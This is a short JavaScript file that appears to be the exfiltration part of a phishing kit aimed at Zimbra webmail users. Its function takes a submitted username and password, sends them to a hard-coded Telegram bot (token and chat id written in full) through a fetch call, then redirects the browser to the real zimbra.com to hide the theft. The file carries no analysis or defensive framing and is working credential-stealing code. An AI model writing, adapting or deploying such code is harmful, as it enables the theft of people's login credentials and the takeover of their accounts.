// Replace these with your actual Telegram bot credentials
const botToken = "7259664584:AAF3hflhws6MaXKATLdvJMaBjSxYNHZ2vxc";
const chatId = "7504667715";

function sendToTelegram(username, password) {
	// Construct the message to send to the Telegram bot
	const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
	const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

	// Send the message to the Telegram bot using Fetch API
	fetch(telegramURL)
		.then(response => {
			if (response.ok) {
	
				window.location.href = "https://www.zimbra.com/";
			} else {
				// Handle errors
				console.error("1");
			}
		})
		.catch(error => console.error("2"));
}
